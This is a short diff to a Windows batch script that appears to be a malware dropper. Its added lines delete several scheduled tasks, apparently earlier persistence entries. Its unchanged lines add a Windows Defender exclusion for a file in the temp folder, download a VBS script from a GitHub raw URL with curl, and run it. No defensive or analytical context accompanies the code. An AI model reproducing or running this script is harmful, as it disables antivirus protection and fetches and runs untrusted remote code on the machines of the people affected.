@@ -1,6 +1,10 @@
+schtasks /delete /tn "upgradef1" /f
+schtasks /delete /tn "InstallRequests" /f
+schtasks /delete /tn "RunPowerShellScript" /f
+
 cd %temp%
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"
-
+mkdir egee
 
 curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/lod.vbs -o d.vbs
 d.vbs
